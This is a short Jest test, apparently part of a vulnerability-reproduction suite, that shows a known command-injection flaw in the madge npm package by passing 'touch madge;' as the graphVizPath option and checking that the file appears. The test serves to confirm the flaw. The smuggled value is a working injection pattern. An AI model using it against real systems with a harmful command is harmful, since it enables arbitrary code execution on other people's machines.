//error :https://snyk.io/vuln/SNYK-JS-MADGE-1082875
//https://snyk.io/vuln/SNYK-JS-MADGE-1082875
test("Command Injection in madge", () => 
{
    const madge = require('madge');
	const fs = require('fs')
	const path = './madge'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    madge('..', {graphVizPath: "touch madge;"})
    .then((res) => res.image())
    .then((writtenImagePath) => {
    console.log('Image written to ' + writtenImagePath);
    });
        
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	//fs.unlink(path, function(err) {});//deleting the file after creation
});